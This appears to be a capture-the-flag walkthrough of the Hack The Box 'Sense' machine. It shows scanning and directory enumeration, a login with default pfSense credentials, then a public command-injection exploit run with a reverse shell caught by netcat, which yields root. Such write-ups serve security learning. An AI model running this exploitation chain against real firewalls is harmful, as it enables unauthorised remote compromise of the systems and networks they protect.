@@ -1,0 +1,234 @@
+RECON
+root@kali:~/htb# nmap -sC -sV -p- -vv -oA full 10.10.10.60
+PORT    STATE SERVICE  REASON         VERSION
+80/tcp  open  http     syn-ack ttl 63 lighttpd 1.4.35
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Did not follow redirect to https://10.10.10.60/
+443/tcp open  ssl/http syn-ack ttl 63 lighttpd 1.4.35
+|_http-favicon: Unknown favicon MD5: 082559A7867CF27ACAB7E9867A8B320F
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: lighttpd/1.4.35
+|_http-title: Login
+| ssl-cert: Subject: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/localityName=Somecity/emailAddress=Email Address/organizationalUnitName=Organizational Unit Name (eg, section)
+| Issuer: commonName=Common Name (eg, YOUR name)/organizationName=CompanyName/stateOrProvinceName=Somewhere/countryName=US/localityName=Somecity/emailAddress=Email Address/organizationalUnitName=Organizational Unit Name (eg, section)
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2017-10-14T19:21:35
+| Not valid after:  2023-04-06T19:21:35
+| MD5:   65f8 b00f 57d2 3468 2c52 0f44 8110 c622
+| SHA-1: 4f7c 9a75 cb7f 70d3 8087 08cb 8c27 20dc 05f1 bb02
+| -----BEGIN CERTIFICATE-----
+| MIIEKDCCA5GgAwIBAgIJALChaIpiwz41MA0GCSqGSIb3DQEBCwUAMIG/MQswCQYD
+| VQQGEwJVUzESMBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEU
+| MBIGA1UEChMLQ29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVu
+| aXQgTmFtZSAoZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcs
+| IFlPVVIgbmFtZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3MwHhcNMTcx
+| MDE0MTkyMTM1WhcNMjMwNDA2MTkyMTM1WjCBvzELMAkGA1UEBhMCVVMxEjAQBgNV
+| BAgTCVNvbWV3aGVyZTERMA8GA1UEBxMIU29tZWNpdHkxFDASBgNVBAoTC0NvbXBh
+| bnlOYW1lMS8wLQYDVQQLEyZPcmdhbml6YXRpb25hbCBVbml0IE5hbWUgKGVnLCBz
+| ZWN0aW9uKTEkMCIGA1UEAxMbQ29tbW9uIE5hbWUgKGVnLCBZT1VSIG5hbWUpMRww
+| GgYJKoZIhvcNAQkBFg1FbWFpbCBBZGRyZXNzMIGfMA0GCSqGSIb3DQEBAQUAA4GN
+| ADCBiQKBgQC/sWU6By08lGbvttAfx47SWksgA7FavNrEoW9IRp0W/RF9Fp5BQesL
+| L3FMJ0MHyGcfRhnL5VwDCL0E+1Y05az8PY8kUmjvxSvxQCLn6Mh3nTZkiAJ8vpB0
+| WAnjltrTCEsv7Dnz2OofkpqaUnoNGfO3uKWPvRXl9OlSe/BcDStffQIDAQABo4IB
+| KDCCASQwHQYDVR0OBBYEFDK5DS/hTsi9SHxT749Od/p3Lq05MIH0BgNVHSMEgeww
+| gemAFDK5DS/hTsi9SHxT749Od/p3Lq05oYHFpIHCMIG/MQswCQYDVQQGEwJVUzES
+| MBAGA1UECBMJU29tZXdoZXJlMREwDwYDVQQHEwhTb21lY2l0eTEUMBIGA1UEChML
+| Q29tcGFueU5hbWUxLzAtBgNVBAsTJk9yZ2FuaXphdGlvbmFsIFVuaXQgTmFtZSAo
+| ZWcsIHNlY3Rpb24pMSQwIgYDVQQDExtDb21tb24gTmFtZSAoZWcsIFlPVVIgbmFt
+| ZSkxHDAaBgkqhkiG9w0BCQEWDUVtYWlsIEFkZHJlc3OCCQCwoWiKYsM+NTAMBgNV
+| HRMEBTADAQH/MA0GCSqGSIb3DQEBCwUAA4GBAHNn+1AX2qwJ9zhgN3I4ES1Vq84l
+| n6p7OoBefxcf31Pn3VDnbvJJFFcZdplDxbIWh5lyjpTHRJQyHECtEMW677rFXJAl
+| /cEYWHDndn9Gwaxn7JyffK5lUAPMPEDtudQb3cxrevP/iFZwefi2d5p3jFkDCcGI
+| +Y0tZRIRzHWgQHa/
+|_-----END CERTIFICATE-----
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+
+WEB ENUM
+
+gobuster dir -w /usr/share/dirbuster/wordlists/ -u https://10.10.10.60 -k -x txt,php,html -t 40
+
+root@kali:~/htb/sense# /root/dirsearch/dirsearch.py -u https://10.10.10.60 -e asp,aspx,bat,c,cfm,cgi,com,dll,exe,htm,html,inc,jhtml,jsa,jsp,log,mdb,nsf,php,phtml,pl,reg,sh,shtml,sql,txt,xml,/,js,conf -x 403,400 
+
+  _|. _ _  _  _  _ _|_    v0.4.0
+ (_||| _) (/_(_|| (_| )
+
+Extensions: asp, aspx, bat, c, cfm, cgi, com, dll, exe, htm, html, inc, jhtml, jsa, jsp, log, mdb, nsf, php, phtml, pl, reg, sh, shtml, sql, txt, xml, /, js | HTTP method: GET | Threads: 20 | Wordlist size: 21119
+
+Error Log: /root/dirsearch/logs/errors-20-11-19_08-28-09.log
+
+Target: https://10.10.10.60/
+
+Output File: /root/dirsearch/reports/10.10.10.60/_20-11-19_08-28-09.txt
+
+[08:28:09] Starting: 
+[08:28:12] 200 -    6KB - ///
+[08:28:44] 200 -  271B  - //changelog.txt
+[08:28:44] 301 -    0B  - //classes  ->  https://10.10.10.60/classes/
+[08:28:46] 301 -    0B  - //css  ->  https://10.10.10.60/css/
+[08:28:48] 200 -    6KB - //edit.php
+[08:28:50] 200 -    1KB - //favicon.ico
+[08:28:53] 301 -    0B  - //includes  ->  https://10.10.10.60/includes/
+[08:28:53] 200 -  329B  - //index.html
+[08:28:53] 200 -    6KB - //index.php
+[08:28:53] 200 -    6KB - //index.php/login/
+[08:28:54] 301 -    0B  - //installer  ->  https://10.10.10.60/installer/
+[08:28:54] 301 -    0B  - //javascript  ->  https://10.10.10.60/javascript/
+[08:28:55] 200 -    6KB - //license.php
+[08:29:15] 200 -    6KB - //system.php
+[08:29:16] 301 -    0B  - //themes  ->  https://10.10.10.60/themes/
+[08:29:20] 200 -  384B  - //xmlrpc.php
+
+GOBUSTER DISCOVERS ADDITIONAL PAGES
+root@kali:~/htb# gobuster -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u https://10.10.10.60 -k -x txt,php,html -t 40
+
+Gobuster v1.4.1              OJ Reeves (@TheColonial)
+=====================================================
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : https://10.10.10.60/
+[+] Threads      : 40
+[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes : 200,204,301,302,307
+[+] Extensions   : .txt,.php,.html
+=====================================================
+/index.php (Status: 200)
+/help.php (Status: 200)
+/index.html (Status: 200)
+/themes (Status: 301)
+/stats.php (Status: 200)
+/css (Status: 301)
+/includes (Status: 301)
+/edit.php (Status: 200)
+/license.php (Status: 200)
+/system.php (Status: 200)
+/status.php (Status: 200)
+/javascript (Status: 301)
+/changelog.txt (Status: 200)
+/classes (Status: 301)
+/exec.php (Status: 200)
+/widgets (Status: 301)
+/graph.php (Status: 200)
+/tree (Status: 301)
+/wizard.php (Status: 200)
+/shortcuts (Status: 301)
+/pkg.php (Status: 200)
+/installer (Status: 301)
+/wizards (Status: 301)
+/xmlrpc.php (Status: 200)
+/reboot.php (Status: 200)
+/interfaces.php (Status: 200)
+/csrf (Status: 301)
+/system-users.txt (Status: 200)
+/filebrowser (Status: 301)
+
+REVIEW WEBPAGES CHANGELOG AND SYSTEM USERS
+https://10.10.10.60/changelog.txt
+# Security Changelog 
+
+### Issue
+There was a failure in updating the firewall. Manual patching is therefore required
+
+### Mitigated
+2 of 3 vulnerabilities have been patched.
+
+### Timeline
+The remaining patches will be installed during the next maintenance window
+
+
+####Support ticket###
+
+Please create the following user
+
+https://10.10.10.60/system-users.txt
+username: Rohit
+password: company defaults
+
+LOGIN WITH DEFAULT PFSENSE PASSWORD AND USER ROHIT
+username: rohit
+password: pfsense
+
+DEFAULT PFSENSE CREDENTIALS
+admin
+pfsense
+
+GATHER SYSTEM DETAILS
+ 	2.1.3-RELEASE (amd64)
+built on Thu May 01 15:52:13 EDT 2014
+FreeBSD 8.3-RELEASE-p16
+
+SEARCH FOR EXPLOIT
+root@kali:~/htb/sense# searchsploit pfsense 2.1
+---------------------------------------------------- ----------------------------------------
+ Exploit Title                                      |  Path
+                                                    | (/usr/share/exploitdb/)
+---------------------------------------------------- ----------------------------------------
+pfSense 2.1 build 20130911-1816 - Directory Travers | exploits/php/webapps/31263.txt
+pfSense < 2.1.4 - 'status_rrd_graph_img.php' Comman | exploits/php/webapps/43560.py
+---------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+root@kali:~/htb/sense# searchsploit -m 43560.py
+  Exploit: pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection
+      URL: https://www.exploit-db.com/exploits/43560/
+     Path: /usr/share/exploitdb/exploits/php/webapps/43560.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /root/htb/sense/43560.py
+
+DETERMINE SCRIPT PARAMETERS
+root@kali:~/htb/sense# cat 43560.py 
+
+parser.add_argument("--rhost", help = "Remote Host")
+parser.add_argument('--lhost', help = 'Local Host listener')
+parser.add_argument('--lport', help = 'Local Port listener')
+parser.add_argument("--username", help = "pfsense Username")
+parser.add_argument("--password", help = "pfsense Password")
+
+RUN EXPLOIT
+root@kali:~/htb/sense# python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.8 --lport 1234 --username rohit --password pfsense
+CSRF token obtained
+Running exploit...
+Exploit completed
+
+GET ROOT SHELL
+root@kali:~/htb/sense# nc -lvp 1234
+listening on [any] 1234 ...
+10.10.10.60: inverse host lookup failed: Unknown host
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.60] 28631
+sh: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+# pwd
+/var/db/rrd
+# ls -l /home
+total 8
+drwxrwxr-x  2 root   operator  512 Oct 14  2017 .snap
+drwxr-xr-x  2 rohit  nobody    512 Oct 14  2017 rohit
+
+GET USER FLAG
+# ls -l /home/rohit
+total 8
+-rw-r--r--  1 rohit  nobody  1003 Oct 14  2017 .tcshrc
+-rw-r--r--  1 root   nobody    32 Oct 14  2017 user.txt
+# cat /home/rohit/user.txt
+##################################
+
+GET ROOT FLAG
+# ls -l /root
+total 28
+-rw-r--r--  1 root  wheel   724 May  1  2014 .cshrc
+-rw-r--r--  1 root  wheel     0 Oct 14  2017 .first_time
+-rw-r--r--  1 root  wheel   167 May  1  2014 .gitsync_merge.sample
+-rw-r--r--  1 root  wheel     0 May  1  2014 .hushlogin
+-rw-r--r--  1 root  wheel   229 May  1  2014 .login
+-rw-r--r--  1 root  wheel     0 Oct 14  2017 .part_mount
+-rw-r--r--  1 root  wheel   165 May  1  2014 .profile
+-rw-r--r--  1 root  wheel   165 May  1  2014 .shrc
+-rw-r--r--  1 root  wheel  1003 Oct 14  2017 .tcshrc
+-rw-r--r--  1 root  wheel    33 Oct 18  2017 root.txt
+# cat /root/root.txt
+#####################################
